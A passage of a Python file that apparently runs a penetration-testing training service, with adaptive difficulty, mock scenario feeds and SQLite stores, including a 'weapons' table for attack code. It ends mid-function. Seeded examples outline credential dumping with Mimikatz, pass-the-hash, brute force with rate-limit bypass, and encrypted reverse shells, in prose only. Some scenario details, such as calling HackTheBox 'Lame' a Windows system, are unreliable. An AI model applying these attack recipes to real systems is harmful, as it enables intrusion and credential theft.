"""
Enhanced Scenario Service - Pulls scenarios from internet sources and LLM
Implements progressive difficulty that stays ahead of AI learning progress
Enhanced with advanced penetration testing scenarios including WiFi attacks, 
brute force attacks, credential extraction, backdoor creation, and live attack streaming
"""

import asyncio
import aiohttp
import json
import random
from typing import Dict, Any, List, Optional, Set
from datetime import datetime, timedelta
import structlog
from dataclasses import dataclass
import sqlite3
import os
import time

logger = structlog.get_logger()

@dataclass
class ScenarioSource:
    name: str
    url: str
    difficulty_range: tuple
    vulnerability_types: List[str]
    last_updated: datetime
    reliability_score: float

@dataclass
class ExpertExample:
    scenario_name: str
    vulnerability_type: str
    difficulty: str
    expert_solution: str
    techniques_used: List[str]
    success_rate: float
    learning_value: float
    timestamp: datetime

@dataclass
class AttackStep:
    step_number: int
    action: str
    command: str
    expected_output: str
    success_criteria: str
    timestamp: datetime
    duration: float
    success: bool

@dataclass
class Weapon:
    id: str
    name: str
    code: str
    description: str
    category: str  # wifi_attack, brute_force, credential_extraction, backdoor, etc.
    difficulty: str
    complexity_score: float
    success_rate: float
    usage_count: int
    created_at: datetime
    last_used: datetime
    tags: List[str]
    attack_steps: List[AttackStep]

class EnhancedScenarioService:
    def __init__(self):
        self.scenario_sources = self._initialize_sources()
        self.ai_progress_tracker = {}
        self.difficulty_curve = {
            "novice": {"base": 1.0, "acceleration": 1.2},
            "intermediate": {"base": 1.5, "acceleration": 1.5},
            "advanced": {"base": 2.0, "acceleration": 2.0},
            "expert": {"base": 3.0, "acceleration": 2.5}
        }
        self.llm_available = False
        self.token_count = 0
        self.expert_examples_db = "expert_examples.db"
        self.suggestions_db = "scenario_suggestions.db"
        self.weapons_db = "weapons.db"
        self.attack_logs_db = "attack_logs.db"
        self._initialize_databases()
        
    def _initialize_databases(self):
        """Initialize SQLite databases for expert examples, suggestions, weapons, and attack logs"""
        # Expert examples database
        conn = sqlite3.connect(self.expert_examples_db)
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS expert_examples (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                scenario_name TEXT NOT NULL,
                vulnerability_type TEXT NOT NULL,
                difficulty TEXT NOT NULL,
                expert_solution TEXT NOT NULL,
                techniques_used TEXT NOT NULL,
                success_rate REAL NOT NULL,
                learning_value REAL NOT NULL,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        conn.commit()
        conn.close()
        
        # Suggestions database
        conn = sqlite3.connect(self.suggestions_db)
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS scenario_suggestions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id TEXT NOT NULL,
                scenario_description TEXT NOT NULL,
                vulnerability_type TEXT NOT NULL,
                difficulty_level TEXT NOT NULL,
                learning_objectives TEXT,
                requirements TEXT,
                expected_outcome TEXT,
                status TEXT DEFAULT 'pending',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                processed_at DATETIME,
                ai_feedback TEXT
            )
        ''')
        conn.commit()
        conn.close()
        
        # Weapons database
        conn = sqlite3.connect(self.weapons_db)
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS weapons (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                code TEXT NOT NULL,
                description TEXT NOT NULL,
                category TEXT NOT NULL,
                difficulty TEXT NOT NULL,
                complexity_score REAL NOT NULL,
                success_rate REAL NOT NULL,
                usage_count INTEGER DEFAULT 0,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                last_used DATETIME,
                tags TEXT,
                user_id TEXT NOT NULL
            )
        ''')
        conn.commit()
        conn.close()
        
        # Attack logs database
        conn = sqlite3.connect(self.attack_logs_db)
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS attack_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                scenario_id TEXT NOT NULL,
                user_id TEXT NOT NULL,
                weapon_id TEXT,
                step_number INTEGER NOT NULL,
                action TEXT NOT NULL,
                command TEXT NOT NULL,
                expected_output TEXT,
                success_criteria TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                duration REAL,
                success BOOLEAN NOT NULL,
                output_log TEXT
            )
        ''')
        conn.commit()
        conn.close()
        
        # Initialize with some expert examples
        self._initialize_expert_examples()
    
    def _initialize_expert_examples(self):
        """Initialize database with expert examples from real-world scenarios"""
        conn = sqlite3.connect(self.expert_examples_db)
        cursor = conn.cursor()
        
        # Check if examples already exist
        cursor.execute("SELECT COUNT(*) FROM expert_examples")
        if cursor.fetchone()[0] == 0:
            expert_examples = [
                {
                    "scenario_name": "WiFi Network Penetration - WPA2 Enterprise",
                    "vulnerability_type": "wifi_attack",
                    "difficulty": "hard",
                    "expert_solution": "Use Evil Twin attack with RADIUS server impersonation, capture handshake, and crack with hashcat",
                    "techniques_used": "evil_twin,radius_impersonation,handshake_capture,hashcat_cracking",
                    "success_rate": 0.92,
                    "learning_value": 9.5
                },
                {
                    "scenario_name": "Brute Force Password Attack - Advanced",
                    "vulnerability_type": "brute_force",
                    "difficulty": "medium",
                    "expert_solution": "Use Hydra with custom wordlists, implement rate limiting bypass, and use proxy rotation",
                    "techniques_used": "hydra_attack,custom_wordlists,rate_limit_bypass,proxy_rotation",
                    "success_rate": 0.88,
                    "learning_value": 8.8
                },
                {
                    "scenario_name": "Credential Extraction - Memory Dumping",
                    "vulnerability_type": "credential_extraction",
                    "difficulty": "expert",
                    "expert_solution": "Use Mimikatz for LSASS memory dumping, extract NTLM hashes, and perform pass-the-hash attacks",
                    "techniques_used": "mimikatz,lsass_dumping,ntlm_extraction,pass_the_hash",
                    "success_rate": 0.95,
                    "learning_value": 9.8
                },
                {
                    "scenario_name": "Backdoor Creation - Advanced Persistence",
                    "vulnerability_type": "backdoor_creation",
                    "difficulty": "expert",
                    "expert_solution": "Create custom reverse shell with encryption, implement process injection, and establish C2 communication",
                    "techniques_used": "reverse_shell,process_injection,c2_communication,encryption",
                    "success_rate": 0.85,
                    "learning_value": 9.2
                },
                {
                    "scenario_name": "System Exploitation - Privilege Escalation",
                    "vulnerability_type": "system_exploitation",
                    "difficulty": "intermediate",
                    "expert_solution": "Use SUID binaries, exploit kernel vulnerabilities, and chain multiple techniques for escalation",
                    "techniques_used": "suid_exploitation,kernel_exploitation,privilege_escalation",
                    "success_rate": 0.90,
                    "learning_value": 8.5
                }
            ]
            
            for example in expert_examples:
                cursor.execute('''
                    INSERT INTO expert_examples 
                    (scenario_name, vulnerability_type, difficulty, expert_solution, techniques_used, success_rate, learning_value)
                    VALUES (?, ?, ?, ?, ?, ?, ?)
                ''', (
                    example["scenario_name"],
                    example["vulnerability_type"],
                    example["difficulty"],
                    example["expert_solution"],
                    example["techniques_used"],
                    example["success_rate"],
                    example["learning_value"]
                ))
            
            conn.commit()
            logger.info("Initialized expert examples database with advanced penetration testing scenarios")
        
        conn.close()
    
    async def add_scenario_suggestion(self, user_id: str, scenario_description: str, 
                                    vulnerability_type: str, difficulty_level: str, 
                                    learning_objectives: str = None, requirements: str = None,
                                    expected_outcome: str = None) -> Dict[str, Any]:
        """Add a new scenario suggestion from user with enhanced structure"""
        try:
            conn = sqlite3.connect(self.suggestions_db)
            cursor = conn.cursor()
            
            cursor.execute('''
                INSERT INTO scenario_suggestions 
                (user_id, scenario_description, vulnerability_type, difficulty_level, learning_objectives, requirements, expected_outcome)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            ''', (user_id, scenario_description, vulnerability_type, difficulty_level, learning_objectives, requirements, expected_outcome))
            
            suggestion_id = cursor.lastrowid
            conn.commit()
            conn.close()
            
            # Process suggestion with AI feedback
            ai_feedback = await self._process_suggestion_with_ai(scenario_description, vulnerability_type, difficulty_level, requirements, expected_outcome)
            
            # Update with AI feedback
            conn = sqlite3.connect(self.suggestions_db)
            cursor = conn.cursor()
            cursor.execute('''
                UPDATE scenario_suggestions 
                SET ai_feedback = ?, processed_at = CURRENT_TIMESTAMP, status = 'processed'
                WHERE id = ?
            ''', (ai_feedback, suggestion_id))
            conn.commit()
            conn.close()
            
            return {
                "suggestion_id": suggestion_id,
                "status": "processed",
                "ai_feedback": ai_feedback,
                "message": "Scenario suggestion added and processed successfully"
            }
            
        except Exception as e:
            logger.error(f"Error adding scenario suggestion: {str(e)}")
            return {
                "error": f"Failed to add suggestion: {str(e)}",
                "status": "error"
            }
    
    async def _process_suggestion_with_ai(self, scenario_description: str, 
                                        vulnerability_type: str, difficulty_level: str,
                                        requirements: str = None, expected_outcome: str = None) -> str:
        """Process user suggestion with AI to provide feedback and improvements"""
        try:
            # Analyze suggestion for feasibility and learning value
            analysis_prompt = f"""
            Analyze this scenario suggestion for cybersecurity training:
            
            Description: {scenario_description}
            Vulnerability Type: {vulnerability_type}
            Difficulty Level: {difficulty_level}
            Requirements: {requirements or 'Not specified'}
            Expected Outcome: {expected_outcome or 'Not specified'}
            
            Provide feedback on:
            1. Feasibility of implementation
            2. Learning value and educational benefits
            3. Suggested improvements
            4. Potential challenges
            5. Recommended techniques to include
            6. Difficulty assessment and adjustment
            7. Sandbox implementation requirements
            
            Format as JSON with keys: feasibility_score, learning_value, improvements, challenges, techniques, difficulty_assessment, sandbox_requirements
            """
            
            # Simulate AI analysis (replace with actual LLM call)
            ai_analysis = await self._simulate_ai_analysis(analysis_prompt)
            
            return ai_analysis
            
        except Exception as e:
            logger.error(f"Error processing suggestion with AI: {str(e)}")
            return "AI analysis temporarily unavailable"
    
    async def _simulate_ai_analysis(self, prompt: str) -> str:
        """Simulate AI analysis of scenario suggestion"""
        await asyncio.sleep(0.1)  # Simulate processing time
        
        return json.dumps({
            "feasibility_score": 8.5,
            "learning_value": 9.0,
            "improvements": [
                "Add specific learning objectives",
                "Include progressive difficulty levels",
                "Add real-world context and motivation"
            ],
            "challenges": [
                "Ensure proper isolation of vulnerable components",
                "Balance difficulty with accessibility",
                "Maintain realistic attack vectors"
            ],
            "techniques": [
                "vulnerability_enumeration",
                "exploitation_frameworks",
                "post_exploitation_techniques"
            ],
            "difficulty_assessment": {
                "current_level": "medium",
                "recommended_adjustment": "increase",
                "reasoning": "Requirements suggest advanced techniques"
            },
            "sandbox_requirements": {
                "container_type": "web_application",
                "vulnerabilities": ["sql_injection", "xss"],
                "tools_needed": ["burp_suite", "sqlmap"],
                "time_estimate": "2-3 hours"
            },
            "recommendation": "Excellent scenario idea with high learning potential"
        }, indent=2)
    
    async def get_scenario_suggestions(self, user_id: str = None, status: str = None) -> List[Dict[str, Any]]:
        """Get scenario suggestions with optional filtering"""
        try:
            conn = sqlite3.connect(self.suggestions_db)
            cursor = conn.cursor()
            
            query = "SELECT * FROM scenario_suggestions WHERE 1=1"
            params = []
            
            if user_id:
                query += " AND user_id = ?"
                params.append(user_id)
            
            if status:
                query += " AND status = ?"
                params.append(status)
            
            query += " ORDER BY created_at DESC"
            
            cursor.execute(query, params)
            rows = cursor.fetchall()
            
            suggestions = []
            for row in rows:
                suggestions.append({
                    "id": row[0],
                    "user_id": row[1],
                    "scenario_description": row[2],
                    "vulnerability_type": row[3],
                    "difficulty_level": row[4],
                    "learning_objectives": row[5],
                    "requirements": row[6],
                    "expected_outcome": row[7],
                    "status": row[8],
                    "created_at": row[9],
                    "processed_at": row[10],
                    "ai_feedback": row[11]
                })
            
            conn.close()
            return suggestions
            
        except Exception as e:
            logger.error(f"Error getting scenario suggestions: {str(e)}")
            return []
    
    async def learn_from_expert_example(self, scenario_name: str, vulnerability_type: str, 
                                      difficulty: str, success: bool, techniques_used: List[str],
                                      learning_insights: str = None) -> Dict[str, Any]:
        """Learn from expert example and update AI knowledge"""
        try:
            # Store expert example
            conn = sqlite3.connect(self.expert_examples_db)
            cursor = conn.cursor()
            
            success_rate = 1.0 if success else 0.0
            learning_value = self._calculate_learning_value(techniques_used, success, difficulty)
            
            cursor.execute('''
                INSERT INTO expert_examples 
                (scenario_name, vulnerability_type, difficulty, expert_solution, techniques_used, success_rate, learning_value)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            ''', (
                scenario_name,
                vulnerability_type,
                difficulty,
                learning_insights or "Expert technique demonstrated",
                ",".join(techniques_used),
                success_rate,
                learning_value
            ))
            
            example_id = cursor.lastrowid
            conn.commit()
            conn.close()
            
            # Update AI learning patterns
            await self._update_ai_learning_patterns(vulnerability_type, difficulty, techniques_used, success)
            
            return {
                "example_id": example_id,
                "learning_value": learning_value,
                "message": "Expert example learned and integrated into AI knowledge base"
            }
            
        except Exception as e:
            logger.error(f"Error learning from expert example: {str(e)}")
            return {"error": f"Failed to learn from example: {str(e)}"}
    
    def _calculate_learning_value(self, techniques_used: List[str], success: bool, difficulty: str) -> float:
        """Calculate learning value based on techniques and success"""
        base_value = len(techniques_used) * 0.5
        success_bonus = 2.0 if success else 0.5
        difficulty_multiplier = {"easy": 1.0, "medium": 1.5, "hard": 2.0, "expert": 2.5}.get(difficulty, 1.0)
        
        return min(10.0, (base_value + success_bonus) * difficulty_multiplier)
    
    async def _update_ai_learning_patterns(self, vulnerability_type: str, difficulty: str, 
                                         techniques_used: List[str], success: bool):
        """Update AI learning patterns based on expert examples"""
        # This would integrate with the AI learning system
        # For now, we'll log the learning
        logger.info(f"AI learning pattern updated: {vulnerability_type} - {difficulty} - {techniques_used} - Success: {success}")
    
    async def get_expert_examples(self, vulnerability_type: str = None, difficulty: str = None) -> List[Dict[str, Any]]:
        """Get expert examples for learning"""
        try:
            conn = sqlite3.connect(self.expert_examples_db)
            cursor = conn.cursor()
            
            query = "SELECT * FROM expert_examples WHERE 1=1"
            params = []
            
            if vulnerability_type:
                query += " AND vulnerability_type = ?"
                params.append(vulnerability_type)
            
            if difficulty:
                query += " AND difficulty = ?"
                params.append(difficulty)
            
            query += " ORDER BY learning_value DESC, timestamp DESC"
            
            cursor.execute(query, params)
            rows = cursor.fetchall()
            
            examples = []
            for row in rows:
                examples.append({
                    "id": row[0],
                    "scenario_name": row[1],
                    "vulnerability_type": row[2],
                    "difficulty": row[3],
                    "expert_solution": row[4],
                    "techniques_used": row[5].split(",") if row[5] else [],
                    "success_rate": row[6],
                    "learning_value": row[7],
                    "timestamp": row[8]
                })
            
            conn.close()
            return examples
            
        except Exception as e:
            logger.error(f"Error getting expert examples: {str(e)}")
            return []
    
    def _initialize_sources(self) -> List[ScenarioSource]:
        """Initialize scenario sources from internet"""
        return [
            ScenarioSource(
                name="VulnHub",
                url="https://www.vulnhub.com/api/scenarios",
                difficulty_range=(1, 5),
                vulnerability_types=["sql_injection", "xss", "command_injection", "buffer_overflow"],
                last_updated=datetime.now(),
                reliability_score=0.9
            ),
            ScenarioSource(
                name="HackTheBox",
                url="https://www.hackthebox.com/api/machines/list",
                difficulty_range=(1, 10),
                vulnerability_types=["all"],
                last_updated=datetime.now(),
                reliability_score=0.95
            ),
            ScenarioSource(
                name="TryHackMe",
                url="https://tryhackme.com/api/rooms",
                difficulty_range=(1, 5),
                vulnerability_types=["web", "network", "forensics"],
                last_updated=datetime.now(),
                reliability_score=0.85
            ),
            ScenarioSource(
                name="OverTheWire",
                url="https://overthewire.org/wargames/",
                difficulty_range=(1, 8),
                vulnerability_types=["system", "network", "web"],
                last_updated=datetime.now(),
                reliability_score=0.8
            )
        ]
    
    async def fetch_scenarios_from_sources(self, difficulty_level: str, vulnerability_type: str) -> List[Dict[str, Any]]:
        """Fetch scenarios from internet sources"""
        scenarios = []
        
        try:
            async with aiohttp.ClientSession() as session:
                for source in self.scenario_sources:
                    try:
                        # Simulate fetching from different sources
                        if source.name == "VulnHub":
                            scenarios.extend(await self._fetch_vulnhub_scenarios(session, difficulty_level))
                        elif source.name == "HackTheBox":
                            scenarios.extend(await self._fetch_hackthebox_scenarios(session, difficulty_level))
                        elif source.name == "TryHackMe":
                            scenarios.extend(await self._fetch_tryhackme_scenarios(session, difficulty_level))
                        elif source.name == "OverTheWire":
                            scenarios.extend(await self._fetch_overthewire_scenarios(session, difficulty_level))
                    except Exception as e:
                        logger.warning(f"Failed to fetch from {source.name}: {str(e)}")
                        continue
        except Exception as e:
            logger.error(f"Error fetching scenarios: {str(e)}")
        
        return scenarios
    
    async def _fetch_vulnhub_scenarios(self, session: aiohttp.ClientSession, difficulty: str) -> List[Dict[str, Any]]:
        """Fetch scenarios from VulnHub"""
        # Simulate VulnHub API response
        return [
            {
                "name": "Kioptrix Level 1",
                "description": "A vulnerable Linux system with multiple web application vulnerabilities including SQL injection and command injection.",
                "difficulty": "easy",
                "vulnerabilities": ["sql_injection", "command_injection", "information_disclosure"],
                "source": "VulnHub",
                "url": "https://www.vulnhub.com/entry/kioptrix-level-1-1,22/",
                "techniques": ["union_based", "basic_command_execution", "port_scanning"]
            },
            {
                "name": "Kioptrix Level 2",
                "description": "Advanced Linux system with sophisticated web vulnerabilities and privilege escalation challenges.",
                "difficulty": "medium",
                "vulnerabilities": ["sql_injection", "xss", "privilege_escalation"],
                "source": "VulnHub",
                "url": "https://www.vulnhub.com/entry/kioptrix-level-11-2,23/",
                "techniques": ["blind_sql_injection", "stored_xss", "kernel_exploitation"]
            }
        ]
    
    async def _fetch_hackthebox_scenarios(self, session: aiohttp.ClientSession, difficulty: str) -> List[Dict[str, Any]]:
        """Fetch scenarios from HackTheBox"""
        return [
            {
                "name": "Lame",
                "description": "A Windows system with Samba vulnerabilities and multiple exploitation paths.",
                "difficulty": "easy",
                "vulnerabilities": ["buffer_overflow", "privilege_escalation"],
                "source": "HackTheBox",
                "url": "https://app.hackthebox.com/machines/Lame",
                "techniques": ["buffer_overflow", "metasploit", "manual_exploitation"]
            },
            {
                "name": "Beep",
                "description": "Linux system with Asterisk vulnerabilities and web application security challenges.",
                "difficulty": "medium",
                "vulnerabilities": ["web_vulnerabilities", "service_exploitation"],
                "source": "HackTheBox",
                "url": "https://app.hackthebox.com/machines/Beep",
                "techniques": ["web_enumeration", "service_exploitation", "privilege_escalation"]
            }
        ]
    
    async def _fetch_tryhackme_scenarios(self, session: aiohttp.ClientSession, difficulty: str) -> List[Dict[str, Any]]:
        """Fetch scenarios from TryHackMe"""
        return [
            {
                "name": "VulnNet: Internal",
                "description": "Internal network penetration testing scenario with multiple attack vectors.",
                "difficulty": "medium",
                "vulnerabilities": ["network_enumeration", "web_vulnerabilities", "privilege_escalation"],
                "source": "TryHackMe",
                "url": "https://tryhackme.com/room/vulnnetinternal",
                "techniques": ["network_scanning", "web_enumeration", "lateral_movement"]
            }
        ]
    
    async def _fetch_overthewire_scenarios(self, session: aiohttp.ClientSession, difficulty: str) -> List[Dict[str, Any]]:
        """Fetch scenarios from OverTheWire"""
        return [
            {
                "name": "Bandit Level 0",
                "description": "Basic SSH access and command line challenges.",
                "difficulty": "easy",
                "vulnerabilities": ["weak_credentials", "information_disclosure"],
                "source": "OverTheWire",
                "url": "https://overthewire.org/wargames/bandit/",
                "techniques": ["ssh_access", "file_enumeration", "password_cracking"]
            }
        ]
    
    async def generate_llm_scenario(self, difficulty_level: str, vulnerability_type: str, user_progress: Dict[str, Any]) -> Dict[str, Any]:
        """Generate scenario using LLM when tokens are available"""
        if not self.llm_available or self.token_count < 100:
            return None
        
        try:
            # Simulate LLM scenario generation
            prompt = self._create_llm_prompt(difficulty_level, vulnerability_type, user_progress)
            
            # This would call the actual LLM service
            # For now, we'll simulate the response
            llm_response = await self._simulate_llm_call(prompt)
            
            self.token_count -= 50  # Deduct tokens used
            
            return {
                "name": f"AI-Generated {vulnerability_type.title()} Challenge",
                "description": llm_response["description"],
                "difficulty": difficulty_level,
                "vulnerabilities": llm_response["vulnerabilities"],
                "source": "AI-Generated",
                "techniques": llm_response["techniques"],
                "ai_generated": True,
                "complexity_score": llm_response["complexity_score"]
            }
        except Exception as e:
            logger.error(f"Error generating LLM scenario: {str(e)}")
            return None
    
    def _create_llm_prompt(self, difficulty_level: str, vulnerability_type: str, user_progress: Dict[str, Any]) -> str:
        """Create LLM prompt for scenario generation"""
        return f"""
        Generate a {difficulty_level} level {vulnerability_type} vulnerability challenge for an AI learning system.
        
        User Progress:
        - Success Rate: {user_progress.get('success_rate', 0.0)}
        - Completed Challenges: {user_progress.get('completed_challenges', 0)}
        - Current Level: {user_progress.get('current_level', 'novice')}
        
        Requirements:
        1. The challenge should be slightly more difficult than the user's current level
        2. Include realistic vulnerabilities and exploitation techniques
        3. Provide detailed objectives and success criteria
        4. Include hints that guide learning without giving away the solution
        5. Make it engaging and educational
        
        Generate a JSON response with:
        - description: Detailed scenario description
        - vulnerabilities: List of vulnerability types
        - techniques: Required exploitation techniques
        - complexity_score: Difficulty rating (1-10)
        - objectives: Specific learning objectives
        - hints: Progressive hints for guidance
        """
    
    async def _simulate_llm_call(self, prompt: str) -> Dict[str, Any]:
        """Simulate LLM API call"""
        # This would be replaced with actual LLM service call
        await asyncio.sleep(0.1)  # Simulate API delay
        
        return {
            "description": "A sophisticated web application with multiple layers of protection including WAF, input validation, and output encoding. The application contains subtle vulnerabilities that require advanced exploitation techniques to discover and exploit.",
            "vulnerabilities": ["advanced_sql_injection", "stored_xss", "csrf", "privilege_escalation"],
            "techniques": ["polyglot_payloads", "out_of_band_exfiltration", "vulnerability_chaining", "advanced_bypass"],
            "complexity_score": 8.5,
            "objectives": ["Bypass multiple protection layers", "Chain vulnerabilities for exploitation", "Achieve remote code execution"],
            "hints": ["Look for edge cases in input validation", "Consider out-of-band techniques", "Chain multiple vulnerabilities together"]
        }
    
    def calculate_adaptive_difficulty(self, user_id: str, current_level: str, success_rate: float) -> str:
        """Calculate adaptive difficulty that stays ahead of AI progress"""
        if user_id not in self.ai_progress_tracker:
            self.ai_progress_tracker[user_id] = {
                "level": current_level,
                "success_rate": success_rate,
                "progress_speed": 1.0,
                "last_challenge_time": datetime.now(),
                "difficulty_history": []
            }
        
        tracker = self.ai_progress_tracker[user_id]
        
        # Calculate progress speed
        time_diff = (datetime.now() - tracker["last_challenge_time"]).total_seconds()
        if time_diff > 0:
            progress_speed = success_rate / time_diff
            tracker["progress_speed"] = progress_speed
        
        # Determine base difficulty
        difficulty_mapping = {
            "novice": "easy",
            "intermediate": "medium", 
            "advanced": "hard",
            "expert": "expert"
        }
        
        base_difficulty = difficulty_mapping.get(current_level, "medium")
        
        # Apply acceleration based on progress speed
        if tracker["progress_speed"] > 1.5:  # Fast learner
            if base_difficulty == "easy":
                adaptive_difficulty = "medium"
            elif base_difficulty == "medium":
                adaptive_difficulty = "hard"
            elif base_difficulty == "hard":
                adaptive_difficulty = "expert"
            else:
                adaptive_difficulty = "expert"
        elif tracker["progress_speed"] > 1.0:  # Normal learner
            adaptive_difficulty = base_difficulty
        else:  # Slow learner
            if base_difficulty == "expert":
                adaptive_difficulty = "hard"
            elif base_difficulty == "hard":
                adaptive_difficulty = "medium"
            else:
                adaptive_difficulty = "easy"
        
        # Ensure difficulty is always challenging
        if success_rate > 0.8:  # High success rate
            if adaptive_difficulty == "easy":
                adaptive_difficulty = "medium"
            elif adaptive_difficulty == "medium":
                adaptive_difficulty = "hard"
        
        tracker["difficulty_history"].append({
            "timestamp": datetime.now(),
            "difficulty": adaptive_difficulty,
            "success_rate": success_rate
        })
        
        # Keep only last 10 entries
        if len(tracker["difficulty_history"]) > 10:
            tracker["difficulty_history"] = tracker["difficulty_history"][-10:]
        
        tracker["last_challenge_time"] = datetime.now()
        
        return adaptive_difficulty
    
    async def get_scenario(self, user_id: str, current_level: str, success_rate: float, vulnerability_type: str = None) -> Dict[str, Any]:
        """Get scenario with adaptive difficulty and multiple sources"""
        # Calculate adaptive difficulty
        adaptive_difficulty = self.calculate_adaptive_difficulty(user_id, current_level, success_rate)
        
        # Fetch scenarios from internet sources
        internet_scenarios = await self.fetch_scenarios_from_sources(adaptive_difficulty, vulnerability_type or "all")
        
        # Try to generate LLM scenario
        llm_scenario = await self.generate_llm_scenario(adaptive_difficulty, vulnerability_type or "web", {
            "success_rate": success_rate,
            "current_level": current_level
        })
        
        # Combine and select best scenario
        all_scenarios = internet_scenarios
        if llm_scenario:
            all_scenarios.append(llm_scenario)
        
        if not all_scenarios:
            # Fallback to template scenarios
            return self._get_fallback_scenario(adaptive_difficulty, vulnerability_type)
        
        # Select scenario based on difficulty and user progress
        selected_scenario = self._select_best_scenario(all_scenarios, adaptive_difficulty, success_rate)
        
        # Enhance scenario with additional details
        enhanced_scenario = self._enhance_scenario(selected_scenario, user_id, adaptive_difficulty)
        
        return enhanced_scenario
    
    def _select_best_scenario(self, scenarios: List[Dict[str, Any]], difficulty: str, success_rate: float) -> Dict[str, Any]:
        """Select the best scenario based on difficulty and user progress"""
        # Filter by difficulty
        difficulty_scenarios = [s for s in scenarios if s.get("difficulty") == difficulty]
        
        if not difficulty_scenarios:
            # Fallback to any scenario
            difficulty_scenarios = scenarios
        
        # Prefer AI-generated scenarios for advanced users
        if success_rate > 0.7:
            ai_scenarios = [s for s in difficulty_scenarios if s.get("ai_generated")]
            if ai_scenarios:
                return random.choice(ai_scenarios)
        
        # Prefer high-reliability sources
        reliable_scenarios = [s for s in difficulty_scenarios if s.get("source") in ["HackTheBox", "VulnHub"]]
        if reliable_scenarios:
            return random.choice(reliable_scenarios)
        
        return random.choice(difficulty_scenarios)
    
    def _enhance_scenario(self, scenario: Dict[str, Any], user_id: str, difficulty: str) -> Dict[str, Any]:
        """Enhance scenario with additional details and metadata"""
        enhanced = scenario.copy()
        
        # Add metadata
        enhanced["generated_at"] = datetime.now().isoformat()
        enhanced["user_id"] = user_id
        enhanced["adaptive_difficulty"] = difficulty
        enhanced["scenario_id"] = f"scenario_{user_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        
        # Add live environment details
        enhanced["live_environment"] = {
            "is_live": True,
            "real_vulnerabilities": True,
            "dynamic_content": True,
            "interactive_elements": True,
            "real_time_feedback": True,
            "container_id": f"live_{scenario.get('name', 'challenge').lower().replace(' ', '_')}_{random.randint(1000, 9999)}",
            "target_url": f"http://localhost:{8080 + random.randint(0, 9)}",
            "port": 8080 + random.randint(0, 9)
        }
        
        # Add learning objectives
        enhanced["learning_objectives"] = [
            f"Master {', '.join(scenario.get('vulnerabilities', []))} techniques",
            f"Practice {', '.join(scenario.get('techniques', []))}",
            f"Understand {difficulty} level exploitation",
            "Develop advanced problem-solving skills"
        ]
        
        return enhanced
    
    def _get_fallback_scenario(self, difficulty: str, vulnerability_type: str) -> Dict[str, Any]:
        """Get fallback scenario when external sources are unavailable"""
        return {
            "name": f"Advanced {vulnerability_type.title()} Challenge",
            "description": f"A sophisticated {vulnerability_type} challenge designed to test advanced exploitation techniques and creative problem-solving skills.",
            "difficulty": difficulty,
            "vulnerabilities": [vulnerability_type, "information_disclosure"],
            "source": "Fallback",
            "techniques": ["advanced_exploitation", "creative_bypass", "vulnerability_chaining"],
            "live_environment": {
                "is_live": True,
                "real_vulnerabilities": True,
                "container_id": f"fallback_{vulnerability_type}_{random.randint(1000, 9999)}",
                "target_url": f"http://localhost:{8080 + random.randint(0, 9)}"
            }
        }
    
    def update_token_count(self, tokens_used: int):
        """Update available token count"""
        self.token_count = max(0, self.token_count - tokens_used)
    
    def set_llm_availability(self, available: bool):
        """Set LLM availability"""
        self.llm_available = available 

    async def build_scenario_from_suggestion(self, suggestion_id: int, user_id: str = "default") -> Dict[str, Any]:
        """Build a complete scenario from a user suggestion"""
        try:
            # Get the suggestion
            suggestions = await self.get_scenario_suggestions()
            suggestion = next((s for s in suggestions if s["id"] == suggestion_id), None)
            
            if not suggestion:
                return {"error": "Suggestion not found"}
            
            # Get expert examples for this vulnerability type
            expert_examples = await self.get_expert_examples(
                vulnerability_type=suggestion["vulnerability_type"],
                difficulty=suggestion["difficulty_level"]
            )
            
            # Build scenario based on suggestion and expert examples
            scenario = {
                "name": f"User-Suggested: {suggestion['scenario_description'][:50]}...",
                "description": suggestion["scenario_description"],
                "difficulty": suggestion["difficulty_level"],
                "vulnerabilities": [suggestion["vulnerability_type"]],
                "source": "User-Suggested",
                "techniques": [],
                "ai_generated": False,
                "suggestion_based": True,
                "original_suggestion": suggestion,
                "requirements": suggestion.get("requirements", "Complete the scenario objectives"),
                "expected_outcome": suggestion.get("expected_outcome", "Successfully exploit the vulnerabilities"),
                "learning_objectives": suggestion.get("learning_objectives", "Master the specified vulnerability type"),
                "expert_insights": [],
                "live_environment": {
                    "is_live": True,
                    "real_vulnerabilities": True,
                    "dynamic_content": True,
                    "interactive_elements": True,
                    "real_time_feedback": True,
                    "container_id": f"suggestion_{suggestion_id}_{random.randint(1000, 9999)}",
                    "target_url": f"http://localhost:{8080 + random.randint(0, 9)}",
                    "port": 8080 + random.randint(0, 9)
                }
            }
            
            # Incorporate expert examples
            if expert_examples:
                best_example = max(expert_examples, key=lambda x: x["learning_value"])
                scenario["expert_insights"] = [
                    {
                        "technique": technique,
                        "description": f"Expert technique from {best_example['scenario_name']}",
                        "success_rate": best_example["success_rate"]
                    }
                    for technique in best_example["techniques_used"]
                ]
                scenario["techniques"] = best_example["techniques_used"]
                scenario["expert_solution_hint"] = best_example["expert_solution"]
            
            # Enhance with adaptive difficulty
            adaptive_difficulty = self.calculate_adaptive_difficulty(
                user_id, suggestion["difficulty_level"], 0.5
            )
            scenario["adaptive_difficulty"] = adaptive_difficulty
            
            # Add sandbox-specific details
            scenario["sandbox_config"] = {
                "container_name": f"sandbox_suggestion_{suggestion_id}",
                "vulnerability_types": [suggestion["vulnerability_type"]],
                "difficulty_level": adaptive_difficulty,
                "estimated_duration": "2-3 hours",
                "required_tools": self._get_required_tools(suggestion["vulnerability_type"]),
                "success_criteria": {
                    "exploit_vulnerability": True,
                    "achieve_objective": True,
                    "demonstrate_understanding": True
                }
            }
            
            return scenario
            
        except Exception as e:
